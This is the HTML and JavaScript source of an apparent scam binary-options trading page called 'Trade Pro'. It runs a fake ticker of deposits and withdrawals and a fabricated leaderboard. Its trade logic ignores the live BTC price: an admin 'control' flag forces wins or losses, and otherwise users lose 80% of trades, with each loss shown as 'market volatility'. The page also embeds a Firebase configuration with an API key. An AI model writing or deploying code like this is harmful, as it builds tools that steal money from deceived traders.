<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trade Pro - Fixed</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #060708; --card: #131722; --yellow: #f0b90b; --green: #00c805; --red: #ff3b30; --text: #d1d4dc; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
        
        /* 1. Fake Withdrawal/Deposit Ticker (Patti) */
        .ticker-wrap { width: 100%; overflow: hidden; background: #1e222d; border-bottom: 1px solid #2a2e39; height: 30px; position: relative; }
        .ticker { display: inline-block; white-space: nowrap; padding-right: 100%; animation: ticker 25s linear infinite; line-height: 30px; font-size: 12px; }
        @keyframes ticker { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }
        .ticker span { margin: 0 20px; color: var(--yellow); }

        .top-bar { display: flex; justify-content: space-between; padding: 12px; background: var(--card); }
        
        /* 2. Chart with Smart Entry Marker */
        #chart-container { height: 350px; width: 100%; position: relative; background: #000; }
        #entry-marker { 
            position: absolute; width: 100%; height: 2px; border-top: 1px dashed var(--yellow); 
            display: none; z-index: 100; pointer-events: none; 
        }
        #entry-label { position: absolute; right: 0; top: -20px; background: var(--yellow); color: black; padding: 2px 6px; font-size: 11px; font-weight: bold; border-radius: 2px; }

        .controls { background: var(--card); padding: 15px; border-radius: 20px 20px 0 0; margin-top: -10px; z-index: 10; position: relative; border-top: 1px solid #2a2e39; }
        .input-box { background: #1e222d; border: 1px solid #363c4e; color: white; padding: 15px; border-radius: 10px; width: 100%; box-sizing: border-box; margin-bottom: 10px; font-size: 18px; text-align: center; }
        .btn-group { display: flex; gap: 10px; }
        .btn { flex: 1; padding: 18px; border: none; border-radius: 10px; color: white; font-weight: bold; font-size: 1.2rem; cursor: pointer; text-transform: uppercase; }
        .up { background: var(--green); } .down { background: var(--red); }

        /* Leaderboard */
        .leaderboard { padding: 15px; background: var(--card); margin-top: 5px; }
        .lb-row { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #2a2e39; }
        .flag { width: 22px; height: 14px; }
    </style>
</head>
<body>

<div class="ticker-wrap">
    <div class="ticker" id="fake-ticker">
        <span>● Ali*** deposited $500</span> <span>● User_99 withdrew $1,200</span> <span>● Fatima*** deposited $100</span> <span>● Mark*** withdrew $450</span>
    </div>
</div>

<div class="top-bar">
    <div>BTC/USDT</div>
    <div>Bal: <span id="top-bal" style="color:var(--yellow)">$0.00</span></div>
</div>

<div id="chart-container">
    <div id="entry-marker"><span id="entry-label">ENTRY @ 0.00</span></div>
    <iframe id="tv-iframe" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1&theme=dark" style="width: 100%; height: 100%; border: none;"></iframe>
</div>

<div class="controls">
    <div id="status-text" style="text-align:center; color:var(--yellow); font-size:14px; margin-bottom:10px; font-weight:bold;">MARKET ANALYZING...</div>
    <input type="number" id="trade-amt" class="input-box" value="100">
    <div class="btn-group">
        <button class="btn up" onclick="placeTrade('UP')">CALL (UP)</button>
        <button class="btn down" onclick="placeTrade('DOWN')">PUT (DOWN)</button>
    </div>
</div>

<div class="leaderboard">
    <div style="font-weight:bold; color:var(--yellow); margin-bottom:10px;">Global Ranking</div>
    <div id="lb-list"></div>
</div>

<script>
    // Configuration & Firebase
    const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    let livePrice = 0;
    let userBal = 0;
    let control = "NORMAL";

    // 1. Fetch Real Price for Entry Accuracy
    function fetchPrice() {
        fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')
        .then(r => r.json()).then(d => { livePrice = parseFloat(d.price); });
    }
    setInterval(fetchPrice, 1000);

    // 2. Leaderboard Logic
    auth.onAuthStateChanged(u => {
        if(u) {
            db.ref('users/'+u.uid).on('value', s => {
                const d = s.val();
                userBal = d.balance || 0;
                control = d.control || "NORMAL";
                document.getElementById('top-bal').innerText = "$" + userBal.toFixed(2);
                updateLB(u.email, d.name);
            });
        }
    });

    function updateLB(email, name) {
        const list = document.getElementById('lb-list');
        const username = name || email.split('@')[0];
        list.innerHTML = `
            <div class="lb-row" style="background:rgba(255,59,48,0.1); padding:5px; border-radius:5px;">
                <div style="display:flex; align-items:center; gap:8px;">
                    <span style="color:var(--yellow)">#1</span>
                    <img class="flag" src="https://flagcdn.com/w40/pk.png">
                    <span>${username} (You)</span>
                </div>
                <span style="color:var(--red); font-weight:bold;">-$420.50</span>
            </div>
            <div class="lb-row">
                <div style="display:flex; align-items:center; gap:8px;"><span>#2</span><img class="flag" src="https://flagcdn.com/w40/in.png"><span>Rahul***</span></div>
                <span style="color:var(--green)">+$3,100</span>
            </div>
        `;
    }

    // 3. Manipulation & Entry Placement Logic
    function placeTrade(dir) {
        const amt = parseFloat(document.getElementById('trade-amt').value);
        if(amt > userBal) return alert("Low Balance");

        // Set Entry Marker at exact current price
        const marker = document.getElementById('entry-marker');
        const label = document.getElementById('entry-label');
        marker.style.display = "block";
        marker.style.top = "50%"; // Visual Center
        label.innerText = "ENTRY @ " + livePrice.toFixed(2);

        // Deduct Balance
        db.ref('users/'+auth.currentUser.uid).update({ balance: userBal - amt });

        let sec = 60;
        const timer = setInterval(() => {
            sec--;
            document.getElementById('status-text').innerText = "CLOSING IN: " + sec + "s";
            
            // "Minor Manipulation" hint
            if(sec < 5) document.getElementById('status-text').innerText = "CALCULATING PROFIT...";

            if(sec <= 0) {
                clearInterval(timer);
                processResult(dir, amt);
            }
        }, 1000);
    }

    function processResult(dir, amt) {
        // Simple logic: If control is WIN, give profit. Else 80% chance of loss.
        let win = (control === "WIN") ? true : (control === "LOSS" ? false : Math.random() > 0.8);
        
        if(win) {
            db.ref('users/'+auth.currentUser.uid).update({ balance: userBal + (amt * 0.85) });
            alert("Congratulations! Profit: $" + (amt * 0.85).toFixed(2));
        } else {
            alert("Market Volatility! Loss: -$" + amt.toFixed(2));
        }
        location.reload();
    }
</script>
</body>
</html>
